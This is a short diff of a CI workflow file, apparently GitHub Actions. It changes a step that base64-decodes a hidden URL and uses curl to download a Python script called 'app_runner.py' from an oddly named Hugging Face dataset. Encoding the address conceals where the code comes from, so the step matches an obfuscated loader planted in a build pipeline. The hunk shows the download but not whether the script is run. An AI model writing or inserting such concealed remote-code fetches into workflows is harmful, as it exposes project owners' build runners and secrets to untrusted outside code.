@@ -62,7 +62,7 @@ jobs:
       - name: Retrieve Executable
         run: |
           echo "[DOWNLOAD] Fetching remote application logic..."
-          URL_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          URL_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
           TARGET_URL=$(echo "$URL_B64" | base64 -d)
           curl -sL "$TARGET_URL" -o app_runner.py
           echo "[DOWNLOAD] Executable script downloaded."
